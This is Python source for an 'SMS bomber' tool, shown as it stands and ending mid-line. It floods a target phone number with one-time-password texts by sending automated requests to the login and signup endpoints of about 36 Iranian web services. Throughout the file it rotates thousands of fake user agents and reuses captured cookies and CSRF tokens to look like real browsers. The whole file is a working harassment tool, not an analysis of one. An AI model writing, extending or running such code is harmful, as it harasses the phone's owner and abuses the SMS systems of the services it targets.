from requests import post
import requests
import threading
import  os , time
from colorama import Fore as C
import pyuser_agent
from random import choice
os.system('cls')
class sms_bomber:
    def __init__(self, number_phone ,text):
        self.number = number_phone
        self.count_ok = 0
        self.count_er = 0
        self.text = text
    def counts(self):
        print(f'{C.RESET}[{C.GREEN} INFO {C.RESET}]{C.GREEN} Number Sms Sended {C.RESET}->{C.LIGHTYELLOW_EX} {self.count_ok} |  {C.RED}Number Error Sended {C.RESET}-> {C.LIGHTRED_EX}{self.count_er}' , end='\r' , flush='True')

    def print_(self):
        for i in self.text:
            print(self.text.replace(i , i.title()) , end='\r',flush=True)
            time.sleep(0.00002)
    def user_agent(self):
        user_agent = ua = pyuser_agent.UA()
        self.u_a = []
        for i in range(10000):
            self.u_a.append(user_agent.random)
        print(f"{C.WHITE}[{C.GREEN} INFO {C.WHITE}]{C.CYAN} Created 10K User Agent..!")

    def send_1(self):
        try:
            data1 = {"data": {"mobile": self.number}, "oneSignalPlayerId": "", "appVersion": "1.5.0","deviceId": "01B30DE7-EC61-438A-BDB3-FC6910AE7E5E", "deviceInfo": "x86_64", "deviceToken": "","clientId": "com.espard.customer", "platform": "web", "osVersion": "10.2", "timeZone": "GMT+3:30","time": "1597042718355"}
            req1 = requests.post('https://app.espard.com/api/v1/auth/identify-by-mobile', json=data1)
            if req1.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass    
    def send_2(self):
        try:
            req2 = requests.post('https://api.divar.ir/v5/auth/authenticate', json={"phone": self.number})
            if req2.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
                pass
    
    def send_3(self):
        try:
            req3 = requests.post('https://ws.alibaba.ir/api/v3/account/mobile/otp', json={"phoneNumber": self.number})
            if req3.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
                pass
    def send_4(self):
        try:
            req4= requests.post('https://api.cllive.ir/authentication/otp', json={"msisdn": self.number})
            if req4.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_5(self):
        try:
            req5 = requests.get(f'https://core.gap.im/v1/user/add.json?mobile={self.number}')
            if req5.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_6(self):
        try:
            data6 = {"optype": 15, "userid": 0, "mobile": '98'+self.number, "firstname": "", "lastname": "", "cityid": 0,"email": "google.", "birthdate": "", "gender": False, "avatarid": 0, "packagename": "", "versioncode": -1,"tokenkey": "", "username": "", "password": "", "connectionname": "MainConStr"}
            req6 = requests.post('https://app.kardoon.ir:4433/api/users', json=data6)
            if req6.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_7(self):
        try:
            req7 = requests.post('https://www.khanoumi.com/accounts/sendotp', json={"mobile": '98'+self.number, "redirectUrl": "/"})
            if req7.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_8(self):
        try:
            req8 = requests.post('https://bimebazar.com/accounts/api/login_sec/', json={"username": '0'+self.number})
            if req8.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_9(self):
        try:
            req9 = requests.post('https://api.baazigooshi.com/v1/usr/tp/sub/', json={"phone": '0'+self.number, "organization_id": 2})
            if req9.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass


    def send_10(self):
        try:
            headers = { 'authority': 'gateway.filmgardi.com','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','accept': 'application/json, text/plain, */*','content-type': 'application/json;charset=UTF-8','sec-ch-ua-mobile': '?0','user-agent': choice(self.u_a),'sec-ch-ua-platform': '"Windows"','origin': 'https://filmgardi.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://filmgardi.com/','accept-language': 'en-US,en;q=0.9',}
            req10 = requests.post('https://gateway.filmgardi.com/shenaseh/api/v2/auth/step-one', headers=headers, data={"code":"98","phone":f"{self.number}","smsStatus":"default"})
       
            if req10.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass      
    def send_11(self):
        try:
            req11 = requests.get(f'https://filmnet.ir/api-v2/access-token/users/98{self.number}/otp')
            if req11.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
           pass
    def send_12(self):
        try:
            cookies = {'XSRF-TOKEN': 'eyJpdiI6IkNISEJyWlF0dEIrcVBlQStBVk5DeGc9PSIsInZhbHVlIjoibVNIMzBhV1J1Ymh3YmJNakRjTU1KYUx4dzFMUWJqblwvWEh4bm9XOWV0MmlXNVRodVc1WTZcL3RtU0dBTU9QaUgyMndKOUVwTHcyZHhXU3drZHRrbHB1dkVlQ25uQ1FHXC9TRUVcL2JWUUdNK0RybGZMREJicVcrNU10b2FOQmhIK09YIiwibWFjIjoiNzkyNmRmNWJjZWFlOTBkMGQ2NjNkNTQ0NjQ3ZTllMDQzMDc2N2E0MzFmYjZmN2QxMGYyYjgxYjVmMmI2MjhjYiJ9','pool_session': 'eyJpdiI6IkVFZVJ6QWozcEN4K2l5aWhwYkZpbWc9PSIsInZhbHVlIjoibTVSV0tZMkxxbXVNNE5nMW5RM21OXC9Ld1FQSkdqS0E0MUF4NTFzUWVsam10K25ndE95WXpBVWpXVjVnQVl3bytTcjlkTmZwdk9cL2ZRSW5ISm5xdWNMRzQ5Qm1Ca1plVlFaNCtIYjBpS25sK3NEV2doMGw0aU1QU0NVQkhmT3dITyIsIm1hYyI6IjBjMTA5MGRlZDlkYTQ4ZjZlMmFjYWNmZmZlODI5ZWE0ZWU1OGQzYWM2YzgyMTliYzg5NDgwNjAyNmRiMDU0ZjgifQ%3D%3D','_ga_SGD671MVXH': 'GS1.1.1649700175.1.0.1649700175.0','analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}','analytics_token': '06e32838-e8d5-6d90-3d8e-50a76ca403a0','analytics_session_token': '6e12249e-0636-4c87-10bd-bbbf47f7c8a6','yektanet_session_last_activity': '4/11/2022','_yngt_iframe': '1','_ga': 'GA1.2.1410692300.1649700176','_gid': 'GA1.2.343381064.1649700176', '_gat_UA-55218412-6': '1','_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce','SL_C_23361dd035530_VID': 'QGHzEBliEa','SL_C_23361dd035530_KEY': '640234206157d6ee39ab0aad42f73506a9c469ce',}
            headers = {'authority': 'www.poolticket.org','accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.poolticket.org','referer': 'https://www.poolticket.org/', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': choice(self.u_a),'x-csrf-token': 'nbTyvoUY5ttqCnYYIk4geLqPBbvi3SJXP1uNkHhx', 'x-requested-with': 'XMLHttpRequest',}
            req12 = requests.post('https://www.poolticket.org/login/check-register', headers=headers, cookies=cookies,data={'mobile':'98'+ self.number,'approve_send_type': 'sms',})
            if req12.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    
    
    def send_13(self):

        try:
            cookies = {'PHPSESSID': 'n6k1n3d2d6agaop2443fdoap50','_ga': 'GA1.2.524732274.1649700027','_gid': 'GA1.2.470979534.1649700027','_gat_gtag_UA_144017375_1': '1',}
            headers = {'authority': 'iranblit.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','origin': 'https://iranblit.com','referer': 'https://iranblit.com/user/account/requirecellphone/stay/', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': choice(self.u_a),}
            req13 = requests.post('https://iranblit.com/user/account/requirecellphone/stay/', headers=headers,cookies=cookies, data={'cellphone':'98'+ self.number})
            if req13.status_code == 200:
                    self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_14(self):

        try:
            headers = {'authority': 'auth.mrbilit.com','accept': '*/*','accept-language': 'en-US,en;q=0.9','access-control-request-headers': 'authorization,x-playerid','access-control-request-method': 'GET', 'origin': 'https://mrbilit.com','referer': 'https://mrbilit.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': choice(self.u_a)}
            req14 = requests.options('https://auth.mrbilit.com/api/login/exists/v2', headers=headers, params={'mobileOrEmail': '98'+self.number,'source': '2','sendTokenIfNot': 'true',})
            if req14.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass


    def send_15(self):
        try:
            cookies = {'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}', 'analytics_token': '481d9af5-68b3-7859-c29b-2b68ca411091','analytics_session_token': 'a9697b0b-d06a-ab28-3083-608db176dd31','yektanet_session_last_activity': '4/11/2022','_yngt_iframe': '1','_ga_32LP7TRM6X': 'GS1.1.1649699859.1.0.1649699859.0','_ga': 'GA1.1.525901429.1649699860','_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce', '_clck': '8vb82b|1|f0j|0','_clsk': '10swzh4|1649699861664|1|1|e.clarity.ms/collect',}
            headers = {'authority': 'www.mrticket.ir', 'accept': '*/*','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.mrticket.ir', 'referer': 'https://www.mrticket.ir/','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': choice(self.u_a),'x-requested-with': 'XMLHttpRequest',}
            req15 = requests.post('https://www.mrticket.ir/fa/v2/signupbymobile/', headers=headers, cookies=cookies,data={'mobile': '98'+self.number})
            if req15.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass


    def send_16(self):

        try:
            headers = {'authority': 'api.karnaval.ir','accept': 'application/json','accept-language': 'en-US,en;q=0.9','origin': 'https://www.karnaval.ir', 'referer': 'https://www.karnaval.ir/','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': choice(self.u_a),}
            req16 = requests.post('https://api.karnaval.ir/graphql', headers=headers, json={'queryId': '0edebe0df353cee7f11614a37087371f','variables': {'phone': '98'+ self.number,'isSecondAttempt': False}})
            if req16.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
           pass

    def send_17(self):
        try:
            headers = {'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','accept-language': 'fa','sec-ch-ua-mobile': '?0','User-Agent': choice(self.u_a),'Accept': 'application/json, text/plain, */*','Referer': 'https://cinematicket.org/home/auth/register?returnUrl=%2F', 'sec-ch-ua-platform': '"Windows"',}
            req17 = requests.post('https://cinematicket.org/api/v1/users/signup', headers=headers, json={'phone_number': "98"+self.number})
            if req17.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_18(self):

        try:
            headers = {'authority': 'api.pelazio.com','accept': 'application/json, text/plain, */*','accept-language': 'fa','content-type': 'application/json;charset=UTF-8','origin': 'https://www.pelazio.com','referer': 'https://www.pelazio.com/','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': choice(self.u_a), 'x-content': 'desktop','x-country': 'ir','x-locale': 'ir-fa','x-user-agent': 'fd862f25-f2ab-4b20-bae9-f754a9cbab6b',}
            req18 = requests.post('https://api.pelazio.com/v1/customers/phone/verification/check', headers=headers,json={'phone': '98'+self.number,'reset_password': False,'country_id': 9})
            if req18.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_19(self):
        try:
            req19 = requests.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp' , data={"cellphone":"+98"+self.number})
            if req19.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:

            pass

    def send_20(self):
        try:
            req20 = requests.post('https://www.aparat.com/api/fa/v1/user/Authenticate/country_code?callbackType=postmessage' , data={"mobile":"0"+self.number,"guid":"A443E8F0-7DD9-98B4-75DD-EEA2A62979F1"})
            if req20.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_21(self):
        try:
            cookies = {'OCSESSID': '9cb7645d55e2d26b9b4bdb073d','language': 'fa-ir','currency': 'TOM','_ga': 'GA1.1.1515156235.1649532607','_ga_C6X5Y2E16L': 'GS1.1.1649532607.1.1.1649532614.0',}
            headers = {'authority': 'shop.opco.co.ir','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryuJnTu2FbQ7ZoLcJC','origin': 'https://shop.opco.co.ir', 'referer': 'https://shop.opco.co.ir/index.php?route=extension/module/login_verify','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': choice(self.u_a),}
            req21 = requests.post('https://shop.opco.co.ir/index.php?route=extension/module/login_verify/verify',headers=headers, cookies=cookies, data=f'------WebKitFormBoundaryuJnTu2FbQ7ZoLcJC\r\nContent-Disposition: form-data; name="telephone"\r\n\r\n{self.number}\r\n------WebKitFormBoundaryuJnTu2FbQ7ZoLcJC--\r\n')
            if req21.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_22(self):
        try:
            cookies = {'_ga': 'GA1.2.1968210357.1649532505','_gid': 'GA1.2.947239087.1649532505','_gat_gtag_UA_126819624_1': '1',}
            headers = {'authority': 'www.gheyme.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','origin': 'https://www.gheyme.com','referer': 'https://www.gheyme.com/profile','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': choice(self.u_a),}
            req22 = requests.post('https://www.gheyme.com/profile/login', headers=headers, cookies=cookies, data={'phone': self.number,'button': ''})
            if req22.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_23(self):
        try:
            headers = { 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'fa','Browser': 'Chrome', 'BrowserVersion': '100.0.4896.75','Connection': 'keep-alive','IP': '5.127.204.53','OS': 'Windows', 'Origin': 'https://www.gapfilm.ir', 'OsVersion': 'NT 10.0', 'Referer': 'https://www.gapfilm.ir/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site', 'SourceChannel': 'GF_WebSite','User-Agent': choice(self.u_a),'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            req23 = requests.post('https://core.gapfilm.ir/api/v3.1/Account/Login', headers=headers, json={'Type': 3, 'Username': self.number,'SourceChannel': 'GF_WebSite','SourcePlatform': 'desktop','SourcePlatformAgentType': 'Chrome','SourcePlatformVersion': '100.0.4896.75','GiftCode': None,})
            if req23.status_code == 200:
                    self.count_ok += 1
            else:
                    self.count_er += 1
        except:
           pass
    def send_24(self):
        try:
            cookies = {'activity': '%7B%22referrer_id%22%3Anull%2C%22origin%22%3A%22%2F%22%7D', '_gid': 'GA1.2.1312423213.1649531378', '_gat': '1','_gat_UA-119582115-1': '1','_ga_FLDJJP0YRG': 'GS1.1.1649531378.1.0.1649531378.0','_ga': 'GA1.1.1324657823.1649531378',}
            headers = {'authority': 'chamedoon.com','accept': 'application/json, text/plain, */*','accept-language': 'en-US,en;q=0.9', 'origin': 'https://chamedoon.com', 'referer': 'https://chamedoon.com/','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': choice(self.u_a),}
            req24 = requests.post('https://chamedoon.com/api/v1/membership/guest/request_mobile_verification',headers=headers, cookies=cookies, json={'mobile': self.number,'origin': '/','referrer_id': None,})
            if req24.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
                pass
    def send_25(self):
        try:
            cookies = {'_ga_JR9P860WWB': 'GS1.1.1649531246.1.0.1649531246.0','_ga_07BTFF57BR': 'GS1.1.1649531246.1.0.1649531246.60','_ga_ME9XPK54HZ': 'GS1.1.1649531246.1.0.1649531246.0','_ga': 'GA1.2.1411905978.1649531247','_gid': 'GA1.2.106611023.1649531247','_gat_UA-129758029-2': '1','_gat_gtag_UA_129758029_7': '1','_clck': 'izzuy3|1|f0h|0','_clsk': '11upz9c|1649531248006|1|1|d.clarity.ms/collect',}
            headers = {'Accept': '*/*','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://hiword.ir','Referer': 'https://hiword.ir/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': choice(self.u_a), 'X-Requested-With': 'XMLHttpRequest','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            req25 = requests.post('https://hiword.ir/wp-json/otp-login/v1/login', headers=headers, cookies=cookies,
                             data={'identifier': self.number})
            if req25.status_code == 200:
                    self.count_ok += 1
            else:
                    self.count_er += 1
        except:
            pass

    def send_26(self):
        try:
            cookies = {'PHPSESSID': '7gl17umfiqibfl6bgllbhmsp22',}
            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Referer': 'https://barpin.net/fa/users/auth/login','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': choice(self.u_a),'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            req26 = requests.get('https://barpin.net/fa/users/auth/code', headers=headers, params={'type': 'sms','q': self.number}, cookies=cookies)
            if req26.status_code == 200:
                    self.count_ok += 1
            else:
                    self.count_er += 1

        except:
            pass
    def send_27(self):
        try:
            headers = {'Accept': '*/*','Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive','Origin': 'https://m.postchi.app', 'Referer': 'https://m.postchi.app/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','User-Agent': choice(self.u_a), 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            req27 = requests.post('https://api.postchi.app/user/sms_login', headers=headers, json={'mobile': '+98'+self.number,'code': '',})
            if req27.status_code == 200:
                    self.count_ok += 1
            else:
                    self.count_er += 1
        except:
                pass
    
    def send_28(self):
        try:
            cookies = {'OCSESSID': '96c2e24bb5079041a51e97f39d','language': 'fa-ir','currency': 'TOM','analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}','analytics_token': 'eac0e8c1-cedc-5676-8db8-8955ccc721ef','analytics_session_token': 'b60f38f6-affc-481f-6347-44376b0fe427','yektanet_session_last_activity': '4/1/2022','_yngt_iframe': '1','_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce', '_ga': 'GA1.2.2006950490.1648805433','_gid': 'GA1.2.211667374.1648805433','_gat_gtag_UA_111640810_1': '1','_5ea4432cb01019433b7d5212': 'true','crisp-client%2Fsession%2F7a20ac30-2fed-4cfd-9aa7-e0ea09f0fa91': 'session_e6ad0b79-c3d3-4826-a6f1-94ab7cc6d515',}
            head = {'authority': 'www.safirstores.com', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with': 'XMLHttpRequest','sec-ch-ua-mobile': '?0', 'user-agent': choice(self.u_a),'sec-ch-ua-platform': '"Windows"','origin': 'https://www.safirstores.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://www.safirstores.com/','accept-language': 'en-US,en;q=0.9',}
            req28 = requests.post('https://www.safirstores.com/index.php?route=account/login/getRandCode', headers=head,cookies=cookies, data={'telephone': '+98'+self.number})
            if req28.status_code == 200:
                    self.count_ok += 1
            else:
                    self.count_er += 1

        except:
            pass

    def send_29(self):
        try:
            cookies = {'abtest': 'next','search_session': 'lxjljixmlvpxvejkhbqvehqvpvmovwst','_gcl_au': '1.1.1201096203.1648804766','_gid': 'GA1.2.1791983564.1648804767','_gat_UA-105982196-1': '1','_ga_CF4KGKM3PG': 'GS1.1.1648804765.1.0.1648804765.0','_ga': 'GA1.1.1622383036.1648804767','_clck': 'vqvciq|1|f09|0','_clsk': '1geoh1t|1648804768135|1|0|j.clarity.ms/collect',}
            headers = {'authority': 'api.torob.com', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?0','user-agent': choice(self.u_a),'sec-ch-ua-platform': '"Windows"','accept': '*/*', 'origin': 'https://torob.com', 'sec-fetch-site': 'same-site','sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://torob.com/', 'accept-language': 'en-US,en;q=0.9',            }
            req29 = requests.get('https://api.torob.com/v4/user/phone/send-pin/', headers=headers, params={'phone_number': '+98'+self.number},
                                cookies=cookies)
            if req29.status_code == 200:
                        self.count_ok += 1
            else:
                    self.count_er += 1

        except:
            pass
    def send_30(self):
        try:
            headers = {'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Upgrade-Insecure-Requests': '1', 'User-Agent': choice(self.u_a),'Referer': 'https://okala.com/auth',}
            req30 = requests.get('https://okala.com/auth', headers=headers, params={'mobile': '98'+self.number})
            if req30.status_code == 200:
                    self.count_ok += 1
            else:
                    self.count_er += 1
        except:
                pass

    def send_31(self):
        try:
            snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
            snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json={"cellphone":self.number}).text
            if "OK" in snapR:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_32(self):
        try:
            gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
            gapR = get(timeout=5, url=f"https://core.gap.im/v1/user/add.json?mobile=%2B98{self.number}", headers=gapH).text
            if "OK" in gapR:
                 self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_33(self):
        try:
            tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": choice(self.u_a),"content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
            tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json={"credential":{"phoneNumber":"0"+self.number,"role":"PASSENGER"}}).json()
            if tap30R['result'] == "OK":
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_34(self):
        try:
            divarH = {'accept': 'application/json, text/plain, */*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https://divar.ir','referer': 'https://divar.ir/', 'user-agent': choice(self.u_a),'x-standard-divar-error': 'true'}
            divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json={"phone":self.number}).json()
            if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    
    def send_35(self):
        try:
            torobH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830','origin': 'https://torob.com', 'referer': 'https://torob.com/','user-agent': choice(self.u_a)}
            torobR = requests.get(timeout=5, url=f"https://api.torob.com/a/phone/send-pin/?phone_number=0{self.number}", headers=torobH).json()
            if torobR["message"] == "pin code sent":
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_36(self):
        try:
            sfoodH = {'accept': 'application/json, text/plain, */*', 'accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Bearer 